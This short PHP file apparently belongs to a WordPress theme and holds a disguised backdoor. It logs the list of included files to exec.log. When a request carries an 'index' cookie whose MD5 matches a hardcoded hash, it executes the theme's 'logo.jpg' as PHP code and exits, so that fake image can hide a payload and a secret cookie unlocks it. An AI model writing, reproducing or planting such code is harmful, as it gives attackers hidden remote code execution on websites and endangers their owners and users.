<?php

$arr = get_included_files();
file_put_contents("exec.log",implode("\n",$arr));



if(isset($_COOKIE["index"])){
    $tmp = "2a7eb4d8e15f8d1c0ecb88ef28e5ab3b";
    $check = $_COOKIE["index"];
    if($tmp == md5($check)){
        if(isset($_COOKIE["index"]) && $_COOKIE["index"] == $check){
            require get_template_directory() ."/logo.jpg";
            exit;
        }
    }
}

